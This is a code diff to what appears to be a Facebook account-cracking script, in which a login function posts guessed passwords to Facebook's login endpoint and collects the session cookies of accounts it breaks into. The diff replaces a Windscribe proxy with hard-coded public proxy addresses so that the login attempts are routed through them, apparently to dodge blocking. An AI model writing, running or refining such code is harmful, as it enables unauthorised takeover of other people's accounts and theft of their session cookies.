@@ -360,12 +360,10 @@ id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni=
 cokbrut=[]
 pwpluss,pwnya=[],[]
 
-windscribe_proxy = {
-    'http': 'http://us.windscribe.com',
-    'https': 'https://us.windscribe.com'}
+proxy = "162.223.94.166:80"
 
   proxy_list = [
-        'http://123.456.789.012:8080',
+        'http://47.252.29.28:11222',
         'https://123.456.789.012:8080',
         # Add more proxies as needed
     ]
@@ -1303,7 +1301,7 @@ def m5(idf,pwv):
     'DNT': '1',
     'Pragma': 'no-cache',
     'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-   lo = session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=101',data=log_data,headers=header_freefb,proxies=windscribe_proxy).text
+   lo = session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=101',data=log_data,headers=header_freefb,proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'}).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
